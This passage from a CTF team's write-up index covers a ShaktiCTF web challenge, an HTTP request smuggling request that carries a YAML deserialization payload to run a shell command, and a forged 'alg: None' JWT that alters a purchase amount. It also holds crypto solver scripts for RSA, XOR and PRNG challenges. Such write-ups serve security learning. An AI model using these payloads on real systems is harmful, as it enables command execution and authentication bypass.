as Content-Length. So we can give Content-Length and Content_Length, such that the go-proxy will consider only the first Content-Length header, and Werkzeug will consider the second Content_Length header. We can use this trick to smuggle our request to /admin endpoint, thus bypassing the proxy. Combining everything, we can smuggle our request to /admin endpoint using the following request and get the flag. POST / HTTP/1.1 Host: localhost:8000 Content-Length: 151 Content_Length: 0 GET /admin?data=%21%21python%2Fobject%2Fapply%3Asubprocess.check_output%0Aargs%3A%0A-%20-%20cat%0A%20%20-%20flag.txt HTTP/1.1 Host: localhost:8000 GET / HTTP/1.1 Host: localhost:8000 Flag: shaktictf{c0ngr4ts_y0u_bypassed_the_proxy}","title":"Notes V1"},{"location":"ShaktiCTF24/web/ultimate_spiderman_fan/","text":"Ultimate Spiderman Fan Description Welcome to the Spider-Man Merch Portal Challenge! Your mission, should you choose to accept it, is to harness your web-slinging skills and become the ultimate Spider-Fan. Are you ready to prove your worth and claim your rightful place among the elite Spider-Fans? Author: L0xm1 Solution When we visit the challenge link, we are greeted with a Spiderman Merch Shopping Portal where we can purchase Spiderman merchandise. Among the offerings is a \"Spider Surprise\" priced at $5000, exclusively available to ultimate fans. Upon purchasing any Spiderman merch, a cookie named shopping_token is set, containing a JWT token. Let's proceed to jwt.io to decode this token. Our objective is to get the Spider Surprise priced at $5000. To achieve this, we will modify the amount in the JWT token to 5000 and change the algorithm to None. Subsequently, we will update the shopping_token cookie with the updated JWT eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJhbW91bnQiOjUwMDB9.StIPl3HpNpEElSOleho_cOlC2YLRHewcpLI2xkG42AQ . This challenge is based on exploiting the JWT-None algorithm vulnerability. Flag: shaktictf{Y0u_4re_th3_ult1mat3_f4n}","title":"Ultimate Spiderman Fan"},{"location":"ShaktiCTF24/web/ultimate_spiderman_fan/#ultimate-spiderman-fan","text":"Description Welcome to the Spider-Man Merch Portal Challenge! Your mission, should you choose to accept it, is to harness your web-slinging skills and become the ultimate Spider-Fan. Are you ready to prove your worth and claim your rightful place among the elite Spider-Fans? Author: L0xm1 Solution When we visit the challenge link, we are greeted with a Spiderman Merch Shopping Portal where we can purchase Spiderman merchandise. Among the offerings is a \"Spider Surprise\" priced at $5000, exclusively available to ultimate fans. Upon purchasing any Spiderman merch, a cookie named shopping_token is set, containing a JWT token. Let's proceed to jwt.io to decode this token. Our objective is to get the Spider Surprise priced at $5000. To achieve this, we will modify the amount in the JWT token to 5000 and change the algorithm to None. Subsequently, we will update the shopping_token cookie with the updated JWT eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJhbW91bnQiOjUwMDB9.StIPl3HpNpEElSOleho_cOlC2YLRHewcpLI2xkG42AQ . This challenge is based on exploiting the JWT-None algorithm vulnerability. Flag: shaktictf{Y0u_4re_th3_ult1mat3_f4n}","title":"Ultimate Spiderman Fan"},{"location":"crypto/intro/","text":"Cryptography Introduction \"The following repo contains writeups of challenges solved from CTFs by the memebers of Team Shakti\" The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. BlueHensCTF hot-diggity-dog - Arya Arun OTP-1 - Pavani TamuCTF pwngen - ph03n1x ENCODING - Adhithya Sree Mohan ciphper - Adhithya Sree Mohan CyberApocalypseCTF phasestream3 - Pavani phase-stream4 - Sowmya soul-crabber - Sowmya soul-crabber2 - Sowmya little-nightmares - Sowmya wii-phit - Sowmya dCTF Strong password - Arya Arun zh3r0 alice-bob-dave - Pavani CircleConCTF baby-rsa - ph03n1x CRT-RSA - ph03n1x Meadows - ph03n1x SunshineCTF mr.robot - Pavani multiple-exponent - Pavani","title":"Cryptography"},{"location":"crypto/intro/#cryptography","text":"","title":"Cryptography"},{"location":"crypto/intro/#introduction","text":"\"The following repo contains writeups of challenges solved from CTFs by the memebers of Team Shakti\"","title":"Introduction"},{"location":"crypto/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. BlueHensCTF hot-diggity-dog - Arya Arun OTP-1 - Pavani TamuCTF pwngen - ph03n1x ENCODING - Adhithya Sree Mohan ciphper - Adhithya Sree Mohan CyberApocalypseCTF phasestream3 - Pavani phase-stream4 - Sowmya soul-crabber - Sowmya soul-crabber2 - Sowmya little-nightmares - Sowmya wii-phit - Sowmya dCTF Strong password - Arya Arun zh3r0 alice-bob-dave - Pavani CircleConCTF baby-rsa - ph03n1x CRT-RSA - ph03n1x Meadows - ph03n1x SunshineCTF mr.robot - Pavani multiple-exponent - Pavani","title":"The contents of this repo"},{"location":"crypto/BlueHensCTF/hot-diggity-dog/","text":"BlueHens CTF Hot-diggity-dog hot-diggity-dog.py output.txt On observing the files, we find that it is a cryptographic attack- 'Wiener's attack' And we found a script online to decrpyt it. Substituting our values and running it, directly gives us the flag.. UDCTF{5t1ck_t0_65537}","title":"BlueHens CTF"},{"location":"crypto/BlueHensCTF/hot-diggity-dog/#bluehens-ctf","text":"","title":"BlueHens CTF"},{"location":"crypto/BlueHensCTF/hot-diggity-dog/#hot-diggity-dog","text":"hot-diggity-dog.py output.txt On observing the files, we find that it is a cryptographic attack- 'Wiener's attack' And we found a script online to decrpyt it. Substituting our values and running it, directly gives us the flag.. UDCTF{5t1ck_t0_65537}","title":"Hot-diggity-dog"},{"location":"crypto/BlueHensCTF/otp-1/OTP-1/","text":"OTP-1 Description Sloved By: Pavani (@Paavani15793872) Here we have an intersting challenge which involves brute forcing. In the given file, code is given in php Here we have two cipher texts, which are separated by @@ from this we can tell that all characters are uppercase letters. repeated xor : Here we have two cipher texts, try to built a code which allows uppercase letters and xor cipher texts and flag. till now we know that the flag = \"UDCTF{\" (with length = 6) Try to guess letters one by one and xor it with cipher texts accordingly. Flag : UDCTF{w3lcome_t0_0ur_ctf}","title":"OTP-1"},{"location":"crypto/BlueHensCTF/otp-1/OTP-1/#otp-1","text":"","title":"OTP-1"},{"location":"crypto/BlueHensCTF/otp-1/OTP-1/#description","text":"Sloved By: Pavani (@Paavani15793872) Here we have an intersting challenge which involves brute forcing. In the given file, code is given in php Here we have two cipher texts, which are separated by @@ from this we can tell that all characters are uppercase letters. repeated xor : Here we have two cipher texts, try to built a code which allows uppercase letters and xor cipher texts and flag. till now we know that the flag = \"UDCTF{\" (with length = 6) Try to guess letters one by one and xor it with cipher texts accordingly. Flag : UDCTF{w3lcome_t0_0ur_ctf}","title":"Description"},{"location":"crypto/CircleConCTF/Baby-RSA/babyrsa/","text":"CircleConCTF 21' Baby RSA Challenge Points : 100 Points Description Bob and Alice wants to send messages to each other. However , they don't want othre people to see the messages that they are sending . Becasue of this, they choose to use textbook RSA. show Alice and Bob by this isn't secure Attatchments baby_rsa Writeup Attack : Small e attack Solution script import gmpy from Crypto.Util.number import * e = 3 n = 21240130069302595435883573568292543584653982426668643904196630885984119007899960150162877143271928662185885422702123670222165981446412189843665571992895649937195036232374014356896167929469467494531756153911013832353810970941919101050971790197002016280790620714887304192321101311465703150098410331176735899796484284165771555960758054286754565310439163189954842301676099617954811528874343372426916478057819577132937062857039063351856289801979923260408285890418889829381378968646646737194160697920287161229178345666260994127087040393511692642122516019055570881253021165130706539874713965212158253699181636631222365809257 ct = 80505397907128518326368510654343095894448384569115420624567650731853204381479599216226376345254941090872832963619259274943986478887206647256170253591735005504 m = long_to_bytes(gmpy.root(ct,3)[0]) print(m) Flag flag{short_and_to_the_point}","title":"Babyrsa"},{"location":"crypto/CircleConCTF/Baby-RSA/babyrsa/#circleconctf-21","text":"","title":"CircleConCTF 21'"},{"location":"crypto/CircleConCTF/Baby-RSA/babyrsa/#baby-rsa","text":"Challenge Points : 100 Points","title":"Baby RSA"},{"location":"crypto/CircleConCTF/Baby-RSA/babyrsa/#description","text":"Bob and Alice wants to send messages to each other. However , they don't want othre people to see the messages that they are sending . Becasue of this, they choose to use textbook RSA. show Alice and Bob by this isn't secure Attatchments baby_rsa","title":"Description"},{"location":"crypto/CircleConCTF/Baby-RSA/babyrsa/#writeup","text":"Attack : Small e attack","title":"Writeup"},{"location":"crypto/CircleConCTF/Baby-RSA/babyrsa/#solution-script","text":"import gmpy from Crypto.Util.number import * e = 3 n = 21240130069302595435883573568292543584653982426668643904196630885984119007899960150162877143271928662185885422702123670222165981446412189843665571992895649937195036232374014356896167929469467494531756153911013832353810970941919101050971790197002016280790620714887304192321101311465703150098410331176735899796484284165771555960758054286754565310439163189954842301676099617954811528874343372426916478057819577132937062857039063351856289801979923260408285890418889829381378968646646737194160697920287161229178345666260994127087040393511692642122516019055570881253021165130706539874713965212158253699181636631222365809257 ct = 80505397907128518326368510654343095894448384569115420624567650731853204381479599216226376345254941090872832963619259274943986478887206647256170253591735005504 m = long_to_bytes(gmpy.root(ct,3)[0]) print(m)","title":"Solution script"},{"location":"crypto/CircleConCTF/Baby-RSA/babyrsa/#flag","text":"flag{short_and_to_the_point}","title":"Flag"},{"location":"crypto/CircleConCTF/CRT-RSA/crt-rsa/","text":"CircleConCTF 21' CRT RSA Challenge Points : 100 Points *Solved by : Writeup TL;DR - Hastard's Broadcast Attack Script from sage.all import * from Crypto.Util.number import long_to_bytes eval(open(\"crt_rsa\").read()) c = [ct_1,ct_2,ct_3] n = [n_1,n_2,n_3] print(long_to_bytes(gmpy.root(CRT(c,n),3)[0])) Flag flag{infi_nite_jes_t}","title":"Crt rsa"},{"location":"crypto/CircleConCTF/CRT-RSA/crt-rsa/#circleconctf-21","text":"","title":"CircleConCTF 21'"},{"location":"crypto/CircleConCTF/CRT-RSA/crt-rsa/#crt-rsa","text":"Challenge Points : 100 Points *Solved by :","title":"CRT RSA"},{"location":"crypto/CircleConCTF/CRT-RSA/crt-rsa/#writeup","text":"TL;DR - Hastard's Broadcast Attack Script from sage.all import * from Crypto.Util.number import long_to_bytes eval(open(\"crt_rsa\").read()) c = [ct_1,ct_2,ct_3] n = [n_1,n_2,n_3] print(long_to_bytes(gmpy.root(CRT(c,n),3)[0]))","title":"Writeup"},{"location":"crypto/CircleConCTF/CRT-RSA/crt-rsa/#flag","text":"flag{infi_nite_jes_t}","title":"Flag"},{"location":"crypto/CyberApocalypseCTF/Little_Nightmares/","text":"Little Nightmares Solved by: Sowmya (@__4lph4__) Another interesting and number theory challenge from Cyber Apocalypse CTF 2021. Here is the challenge script: from Crypto.Util.number import getPrime, bytes_to_long from random import randint FLAG = b'CHTB{??????????????????????????????????}' flag = bytes_to_long(FLAG) def keygen(): p, q = getPrime(1024), getPrime(1024) N = p*q g, r1, r2 = [randint(1,N) for _ in range(3)] g1, g2 = pow(g, r1*(p-1), N), pow(g, r2*(q-1), N) return [N, g1, g2], [p, q] def encrypt(m, public): N, g1, g2 = public assert m < N, \"Message is too long\" s1, s2 = randint(1,N), randint(1,N) c1 = m*pow(g1,s1,N) % N c2 = m*pow(g2,s2,N) % N return [c1, c2] def decrypt(enc, private): c1, c2 = enc p, q = private m1 = c1 * pow(q, -1, p) * q m2 = c2 * pow(p, -1, q) * p return (m1 + m2) % (p*q) public, private = keygen() enc = encrypt(flag, public) assert flag == decrypt(enc, private) print(f'Public key: {public}') print(f'Encrypted Flag: {enc}') Output: Public key: [15046368688522729878837364795846944447584249939940259042809310309990644722874686184397211078874301515249887625469482926118729767921165680434919436001251916009731653621249173925306213496143518405636216886510423114656445458948673083827223571060637952939874530020017901480576002182201895448100262702822444377134178804257755785230586532510071013644046338971791975792507111644403115625869332161597091770842097004583717690548871004494047953982837491656373096470967389016252220593050830165369469758747361848151735684518721718721910577759955840675047364431973099362772693817698643582567162750607561757926413317531802354973847, 9283319553892803764690461243901070663222428323113425322850741756254277368036028273335428365663191030757323877453365465554132886645468588395631445445583253155195968694862787593653053769030730815589172570039269584478526982112345274390480983685543611640614764128042195018064671336591349166188571572536295612195292864841173479903528383123563226015278849646883506520514470333897880659139687610612049230856991239192330160727258048546502899802982277188877310126410571180236389500463464659397850999622904270520629126455639717497594792781963273264274684421455422023088932590387852813426966580288533263121276557350436900246463, 8170671201621857973407215819397012803619280999847588732628253232283307833188933536560440103969432332185848983745037071025860497584949115721267685519443159539783527315198992420655868110884873218133385835580345201078361745220227561551654718787264374257293351098299807821798471006283753277157555438331734456302990269860368479905882644912688806233577606978042582643369428542665819950283055672363935065844777322370865181261974289403517780920801228770368401030437376412993457855872519154731210534206120823952983817295670102327952847504357905927290367724038039202573992755780477507837498958878434898475866081720566629437645] Encrypted Flag: [7276931928429452854246342065839521806420418866856294154132077445353136752229297971239711445722522895365037966326373464771601590080627182837712349184127450287007143044916049997542062388957038193775059765336324946772584345217059576295657932746876343366393024413356918508539249571136028895868283293788299191933766033783323506852233709102246103073938749386863417754855718482717665887208176012160888333043927323096890710493237011980243014972091979988123240671317403963855512078171350546136813316974298786004332694857700545913951953794486310691251777765023941312078456072442404873687449493571576308437181236785086220324920, 323136689475858283788435297190415326629231841782013470380328322062914421821417044602586721782266492137206976604934554032410738337998164019339195282867579270570771188637636630571301963569622900241602213161396475522976801562853960864577088622021373828937295792222819561111043573007672396987476784672948287600574705736056566374617963948347878220280909003723932805632146024848076789866573232781595349191010186788284504514925388452232227920241883518851862145988532377145521056940790582807479213216240632647108768886842632170415653038740093542869598364804101879631033516030858720540787637217275393603575250765731822252109] This is a customised encryption scheme with paramters N,g1,g2,c1,c2 given. On observing this line in the code: g1, g2 = pow(g, r1*(p-1), N), pow(g, r2*(q-1), N) We get to know that g1 \u2261 1 (mod p) and g2 \u2261 1 (mod q) . Using this we try to get out prime factors. Here's the solution script from Crypto.Util.number import * def decrypt(enc, private): c1, c2 = enc p, q = private m1 = c1 * inverse(q,p) * q m2 = c2 * inverse(p,q) * p return (m1 + m2) % (p*q) N,g1,g2 = [15046368688522729878837364795846944447584249939940259042809310309990644722874686184397211078874301515249887625469482926118729767921165680434919436001251916009731653621249173925306213496143518405636216886510423114656445458948673083827223571060637952939874530020017901480576002182201895448100262702822444377134178804257755785230586532510071013644046338971791975792507111644403115625869332161597091770842097004583717690548871004494047953982837491656373096470967389016252220593050830165369469758747361848151735684518721718721910577759955840675047364431973099362772693817698643582567162750607561757926413317531802354973847, 9283319553892803764690461243901070663222428323113425322850741756254277368036028273335428365663191030757323877453365465554132886645468588395631445445583253155195968694862787593653053769030730815589172570039269584478526982112345274390480983685543611640614764128042195018064671336591349166188571572536295612195292864841173479903528383123563226015278849646883506520514470333897880659139687610612049230856991239192330160727258048546502899802982277188877310126410571180236389500463464659397850999622904270520629126455639717497594792781963273264274684421455422023088932590387852813426966580288533263121276557350436900246463, 8170671201621857973407215819397012803619280999847588732628253232283307833188933536560440103969432332185848983745037071025860497584949115721267685519443159539783527315198992420655868110884873218133385835580345201078361745220227561551654718787264374257293351098299807821798471006283753277157555438331734456302990269860368479905882644912688806233577606978042582643369428542665819950283055672363935065844777322370865181261974289403517780920801228770368401030437376412993457855872519154731210534206120823952983817295670102327952847504357905927290367724038039202573992755780477507837498958878434898475866081720566629437645] enc = [7276931928429452854246342065839521806420418866856294154132077445353136752229297971239711445722522895365037966326373464771601590080627182837712349184127450287007143044916049997542062388957038193775059765336324946772584345217059576295657932746876343366393024413356918508539249571136028895868283293788299191933766033783323506852233709102246103073938749386863417754855718482717665887208176012160888333043927323096890710493237011980243014972091979988123240671317403963855512078171350546136813316974298786004332694857700545913951953794486310691251777765023941312078456072442404873687449493571576308437181236785086220324920, 323136689475858283788435297190415326629231841782013470380328322062914421821417044602586721782266492137206976604934554032410738337998164019339195282867579270570771188637636630571301963569622900241602213161396475522976801562853960864577088622021373828937295792222819561111043573007672396987476784672948287600574705736056566374617963948347878220280909003723932805632146024848076789866573232781595349191010186788284504514925388452232227920241883518851862145988532377145521056940790582807479213216240632647108768886842632170415653038740093542869598364804101879631033516030858720540787637217275393603575250765731822252109] p = GCD(g1-1,N) q = GCD(g2-1,N) private = [p,q] print(long_to_bytes(decrypt(enc,private))) Flag: CHTB{Factoring_With_Fermats_Little_Theorem}","title":"Little Nightmares"},{"location":"crypto/CyberApocalypseCTF/Little_Nightmares/#little-nightmares","text":"Solved by: Sowmya (@__4lph4__) Another interesting and number theory challenge from Cyber Apocalypse CTF 2021. Here is the challenge script: from Crypto.Util.number import getPrime, bytes_to_long from random import randint FLAG = b'CHTB{??????????????????????????????????}' flag = bytes_to_long(FLAG) def keygen(): p, q = getPrime(1024), getPrime(1024) N = p*q g, r1, r2 = [randint(1,N) for _ in range(3)] g1, g2 = pow(g, r1*(p-1), N), pow(g, r2*(q-1), N) return [N, g1, g2], [p, q] def encrypt(m, public): N, g1, g2 = public assert m < N, \"Message is too long\" s1, s2 = randint(1,N), randint(1,N) c1 = m*pow(g1,s1,N) % N c2 = m*pow(g2,s2,N) % N return [c1, c2] def decrypt(enc, private): c1, c2 = enc p, q = private m1 = c1 * pow(q, -1, p) * q m2 = c2 * pow(p, -1, q) * p return (m1 + m2) % (p*q) public, private = keygen() enc = encrypt(flag, public) assert flag == decrypt(enc, private) print(f'Public key: {public}') print(f'Encrypted Flag: {enc}') Output: Public key: [15046368688522729878837364795846944447584249939940259042809310309990644722874686184397211078874301515249887625469482926118729767921165680434919436001251916009731653621249173925306213496143518405636216886510423114656445458948673083827223571060637952939874530020017901480576002182201895448100262702822444377134178804257755785230586532510071013644046338971791975792507111644403115625869332161597091770842097004583717690548871004494047953982837491656373096470967389016252220593050830165369469758747361848151735684518721718721910577759955840675047364431973099362772693817698643582567162750607561757926413317531802354973847, 9283319553892803764690461243901070663222428323113425322850741756254277368036028273335428365663191030757323877453365465554132886645468588395631445445583253155195968694862787593653053769030730815589172570039269584478526982112345274390480983685543611640614764128042195018064671336591349166188571572536295612195292864841173479903528383123563226015278849646883506520514470333897880659139687610612049230856991239192330160727258048546502899802982277188877310126410571180236389500463464659397850999622904270520629126455639717497594792781963273264274684421455422023088932590387852813426966580288533263121276557350436900246463, 8170671201621857973407215819397012803619280999847588732628253232283307833188933536560440103969432332185848983745037071025860497584949115721267685519443159539783527315198992420655868110884873218133385835580345201078361745220227561551654718787264374257293351098299807821798471006283753277157555438331734456302990269860368479905882644912688806233577606978042582643369428542665819950283055672363935065844777322370865181261974289403517780920801228770368401030437376412993457855872519154731210534206120823952983817295670102327952847504357905927290367724038039202573992755780477507837498958878434898475866081720566629437645] Encrypted Flag: [7276931928429452854246342065839521806420418866856294154132077445353136752229297971239711445722522895365037966326373464771601590080627182837712349184127450287007143044916049997542062388957038193775059765336324946772584345217059576295657932746876343366393024413356918508539249571136028895868283293788299191933766033783323506852233709102246103073938749386863417754855718482717665887208176012160888333043927323096890710493237011980243014972091979988123240671317403963855512078171350546136813316974298786004332694857700545913951953794486310691251777765023941312078456072442404873687449493571576308437181236785086220324920, 323136689475858283788435297190415326629231841782013470380328322062914421821417044602586721782266492137206976604934554032410738337998164019339195282867579270570771188637636630571301963569622900241602213161396475522976801562853960864577088622021373828937295792222819561111043573007672396987476784672948287600574705736056566374617963948347878220280909003723932805632146024848076789866573232781595349191010186788284504514925388452232227920241883518851862145988532377145521056940790582807479213216240632647108768886842632170415653038740093542869598364804101879631033516030858720540787637217275393603575250765731822252109] This is a customised encryption scheme with paramters N,g1,g2,c1,c2 given. On observing this line in the code: g1, g2 = pow(g, r1*(p-1), N), pow(g, r2*(q-1), N) We get to know that g1 \u2261 1 (mod p) and g2 \u2261 1 (mod q) . Using this we try to get out prime factors. Here's the solution script from Crypto.Util.number import * def decrypt(enc, private): c1, c2 = enc p, q = private m1 = c1 * inverse(q,p) * q m2 = c2 * inverse(p,q) * p return (m1 + m2) % (p*q) N,g1,g2 = [15046368688522729878837364795846944447584249939940259042809310309990644722874686184397211078874301515249887625469482926118729767921165680434919436001251916009731653621249173925306213496143518405636216886510423114656445458948673083827223571060637952939874530020017901480576002182201895448100262702822444377134178804257755785230586532510071013644046338971791975792507111644403115625869332161597091770842097004583717690548871004494047953982837491656373096470967389016252220593050830165369469758747361848151735684518721718721910577759955840675047364431973099362772693817698643582567162750607561757926413317531802354973847, 9283319553892803764690461243901070663222428323113425322850741756254277368036028273335428365663191030757323877453365465554132886645468588395631445445583253155195968694862787593653053769030730815589172570039269584478526982112345274390480983685543611640614764128042195018064671336591349166188571572536295612195292864841173479903528383123563226015278849646883506520514470333897880659139687610612049230856991239192330160727258048546502899802982277188877310126410571180236389500463464659397850999622904270520629126455639717497594792781963273264274684421455422023088932590387852813426966580288533263121276557350436900246463, 8170671201621857973407215819397012803619280999847588732628253232283307833188933536560440103969432332185848983745037071025860497584949115721267685519443159539783527315198992420655868110884873218133385835580345201078361745220227561551654718787264374257293351098299807821798471006283753277157555438331734456302990269860368479905882644912688806233577606978042582643369428542665819950283055672363935065844777322370865181261974289403517780920801228770368401030437376412993457855872519154731210534206120823952983817295670102327952847504357905927290367724038039202573992755780477507837498958878434898475866081720566629437645] enc = [7276931928429452854246342065839521806420418866856294154132077445353136752229297971239711445722522895365037966326373464771601590080627182837712349184127450287007143044916049997542062388957038193775059765336324946772584345217059576295657932746876343366393024413356918508539249571136028895868283293788299191933766033783323506852233709102246103073938749386863417754855718482717665887208176012160888333043927323096890710493237011980243014972091979988123240671317403963855512078171350546136813316974298786004332694857700545913951953794486310691251777765023941312078456072442404873687449493571576308437181236785086220324920, 323136689475858283788435297190415326629231841782013470380328322062914421821417044602586721782266492137206976604934554032410738337998164019339195282867579270570771188637636630571301963569622900241602213161396475522976801562853960864577088622021373828937295792222819561111043573007672396987476784672948287600574705736056566374617963948347878220280909003723932805632146024848076789866573232781595349191010186788284504514925388452232227920241883518851862145988532377145521056940790582807479213216240632647108768886842632170415653038740093542869598364804101879631033516030858720540787637217275393603575250765731822252109] p = GCD(g1-1,N) q = GCD(g2-1,N) private = [p,q] print(long_to_bytes(decrypt(enc,private))) Flag: CHTB{Factoring_With_Fermats_Little_Theorem}","title":"Little Nightmares"},{"location":"crypto/CyberApocalypseCTF/Phase_Stream4/","text":"Phase Stream 4 Solved by: Sowmya (@__4lph4__) This is the last set of the Phase Stream challenges. This challenge involves the cribdragging approach. Here is the challenge script: from Crypto.Cipher import AES from Crypto.Util import Counter import os KEY = os.urandom(16) def encrypt(plaintext): cipher = AES.new(KEY, AES.MODE_CTR, counter=Counter.new(128)) ciphertext = cipher.encrypt(plaintext) return ciphertext.hex() with open('test_quote.txt', 'rb') as f: test_quote = f.read().strip() print(encrypt(test_quote)) with open('flag.txt', 'rb') as f: flag = f.read().strip() print(encrypt(flag)) Output: 2d0fb3a56aa66e1e44cffc97f3a2e030feab144124e73c76d5d22f6ce01c46e73a50b0edc1a2bd243f9578b745438b00720870e3118194cbb438149e3cc9c0844d640ecdb1e71754c24bf43bf3fd0f9719f74c7179b6816e687fa576abad1955 2767868b7ebb7f4c42cfffa6ffbfb03bf3b8097936ae3c76ef803d76e11546947157bcea9599f826338807b55655a05666446df20c8e9387b004129e10d18e9f526f71cabcf21b48965ae36fcfee1e820cf1076f65 Points to be noted: 1. We are given 2 ciphertexts: 1. Ciphertext of the flag 2. Ciphertext of the quote 2. We know the flag format \"CHTB{\" 3. Key is reused in AES-CTR which reduces its strength to that of XOR We first XOR both the ciphertexts to remove the effect of the key. Now we use the flag format CHTB{ to get the initial part of the quote. Through some guessing and googling we have to figure out the quote little by little. Challenge name is also helpful in guessing some part of the flag. Flag: CHTB{stream_ciphers_with_reused_keystreams_are_vulnerable_to_known_plaintext_attacks}","title":"Phase Stream 4"},{"location":"crypto/CyberApocalypseCTF/Phase_Stream4/#phase-stream-4","text":"Solved by: Sowmya (@__4lph4__) This is the last set of the Phase Stream challenges. This challenge involves the cribdragging approach. Here is the challenge script: from Crypto.Cipher import AES from Crypto.Util import Counter import os KEY = os.urandom(16) def encrypt(plaintext): cipher = AES.new(KEY, AES.MODE_CTR, counter=Counter.new(128)) ciphertext = cipher.encrypt(plaintext) return ciphertext.hex() with open('test_quote.txt', 'rb') as f: test_quote = f.read().strip() print(encrypt(test_quote)) with open('flag.txt', 'rb') as f: flag = f.read().strip() print(encrypt(flag)) Output: 2d0fb3a56aa66e1e44cffc97f3a2e030feab144124e73c76d5d22f6ce01c46e73a50b0edc1a2bd243f9578b745438b00720870e3118194cbb438149e3cc9c0844d640ecdb1e71754c24bf43bf3fd0f9719f74c7179b6816e687fa576abad1955 2767868b7ebb7f4c42cfffa6ffbfb03bf3b8097936ae3c76ef803d76e11546947157bcea9599f826338807b55655a05666446df20c8e9387b004129e10d18e9f526f71cabcf21b48965ae36fcfee1e820cf1076f65 Points to be noted: 1. We are given 2 ciphertexts: 1. Ciphertext of the flag 2. Ciphertext of the quote 2. We know the flag format \"CHTB{\" 3. Key is reused in AES-CTR which reduces its strength to that of XOR We first XOR both the ciphertexts to remove the effect of the key. Now we use the flag format CHTB{ to get the initial part of the quote. Through some guessing and googling we have to figure out the quote little by little. Challenge name is also helpful in guessing some part of the flag. Flag: CHTB{stream_ciphers_with_reused_keystreams_are_vulnerable_to_known_plaintext_attacks}","title":"Phase Stream 4"},{"location":"crypto/CyberApocalypseCTF/Soul_Crabber/","text":"Soul Crabber Solved by: Sowmya (@__4lph4__) , Ashwathi (@Ashwathi_sasi) , Namitha (@N4m1th4_01) The rust code takes input and xor's it with random numbers. Since the seed is same, the series of random numbers generated is same each. So we could run it against a dummy input and xor it with the output to get the series of random no. generated. This array when xored with the given output will give us the flag Solution Script: f2 = [] dummy_out = \"296625b4d4823f73ddd35926ed1839d44c381878c6e19969620e99e36b196f\" dummy_in = \"qwertyuiopasdfghjklzxcvbnmqwe\" for i in range(0,len(dummy_out),2): f2.append(int(\"0x\"+dummy_out[i:i+2],16)) rand_arr = [] for i in range(len(dummy_in)): rand_arr.append((f2[i])^ord(dummy_in[i])) fout = \"1b591484db962f7782d1410afa4a388f7930067bcef6df546a57d9f873\" fo2 = [] for i in range(0,len(fout),2): fo2.append(int(\"0x\"+fout[i:i+2],16)) f= \"\" for i in range(len(rand_arr)): f=f+chr(fo2[i]^rand_arr[i]) print(f) Flag: CHTB{mem0ry_s4f3_crypt0_f41l}","title":"Soul Crabber"},{"location":"crypto/CyberApocalypseCTF/Soul_Crabber/#soul-crabber","text":"Solved by: Sowmya (@__4lph4__) , Ashwathi (@Ashwathi_sasi) , Namitha (@N4m1th4_01) The rust code takes input and xor's it with random numbers. Since the seed is same, the series of random numbers generated is same each. So we could run it against a dummy input and xor it with the output to get the series of random no. generated. This array when xored with the given output will give us the flag Solution Script: f2 = [] dummy_out = \"296625b4d4823f73ddd35926ed1839d44c381878c6e19969620e99e36b196f\" dummy_in = \"qwertyuiopasdfghjklzxcvbnmqwe\" for i in range(0,len(dummy_out),2): f2.append(int(\"0x\"+dummy_out[i:i+2],16)) rand_arr = [] for i in range(len(dummy_in)): rand_arr.append((f2[i])^ord(dummy_in[i])) fout = \"1b591484db962f7782d1410afa4a388f7930067bcef6df546a57d9f873\" fo2 = [] for i in range(0,len(fout),2): fo2.append(int(\"0x\"+fout[i:i+2],16)) f= \"\" for i in range(len(rand_arr)): f=f+chr(fo2[i]^rand_arr[i]) print(f) Flag: CHTB{mem0ry_s4f3_crypt0_f41l}","title":"Soul Crabber"},{"location":"crypto/CyberApocalypseCTF/Soul_Crabber2/","text":"Soul Crabber 2 Solved by: Sowmya (@__4lph4__) , Namitha (@N4m1th4_01) This challenge was similar to it's preceding challenge Soul Crabber but the seed wasn't hardcoded this time. So this is a time based PRNG challenge that should be solved with proper brute force. One issue we faced was that we weren't very familiar with rust, so it took us some time. Here is the challenge script: use rand::{Rng,SeedableRng}; use rand::rngs::StdRng; use std::fs; use std::io::Write; use std::time::SystemTime; fn get_rng() -> StdRng { let seed = SystemTime::now() .duration_since(SystemTime::UNIX_EPOCH) .expect(\"Time is broken\") .as_secs(); return StdRng::seed_from_u64(seed); } fn rand_xor(input : String) -> String { let mut rng = get_rng(); return input .chars() .into_iter() .map(|c| format!(\"{:02x}\", (c as u8 ^ rng.gen::<u8>()))) .collect::<Vec<String>>() .join(\"\"); } fn main() -> std::io::Result<()> { let flag = fs::read_to_string(\"flag.txt\")?; let xored = rand_xor(flag); println!(\"{}\", xored); let mut file = fs::File::create(\"out.txt\")?; file.write(xored.as_bytes())?; Ok(()) } Output: 418a5175c38caf8c1cafa92cde06539d512871605d06b2d01bbc1696f4ff487e9d46ba0b5aaf659807 Using time as the seed is the vulnerability here as only the last few digits are going to be changed in 2 different particular times and therefore, the seed can be bruteforced. In this problem the range to be considered was quite large. Here's the solution script use rand::{Rng, SeedableRng, rngs::StdRng}; use std::fs; use std::io::Write; use std::time::SystemTime; extern crate hex; fn get_rng(seed : u64) -> StdRng { return StdRng::seed_from_u64(seed); } fn rand_xor(input : &Vec<u8>,seed:u64) -> String { let mut rng = get_rng(seed); return input .into_iter() .map(|c| format!(\"{:02x}\", (c as &u8 ^ rng.gen::<u8>()))) .collect::<Vec<String>>() .join(\"\"); } fn main() -> std::io::Result<()> { let mut seed=1618000000; let s1 = String::from(\"418a5175c38caf8c1cafa92cde06539d512871605d06b2d01bbc1696f4ff487e9d46ba0b5aaf659807\"); let decoded = hex::decode(s1).expect(\"Decoding failed\"); let mut file = fs::File::create(\"out.txt\")?; while seed <1619000000{ let xored = format!(\"{}\\n\", rand_xor(&decoded,seed)); seed +=1; file.write_all(xored.as_bytes())?; } Ok(()) } Flag: CHTB{cl4551c_ch4ll3ng3_r3wr1tt3n_1n_ru5t}","title":"Soul Crabber 2"},{"location":"crypto/CyberApocalypseCTF/Soul_Crabber2/#soul-crabber-2","text":"Solved by: Sowmya (@__4lph4__) , Namitha (@N4m1th4_01) This challenge was similar to it's preceding challenge Soul Crabber but the seed wasn't hardcoded this time. So this is a time based PRNG challenge that should be solved with proper brute force. One issue we faced was that we weren't very familiar with rust, so it took us some time. Here is the challenge script: use rand::{Rng,SeedableRng}; use rand::rngs::StdRng; use std::fs; use std::io::Write; use std::time::SystemTime; fn get_rng() -> StdRng { let seed = SystemTime::now() 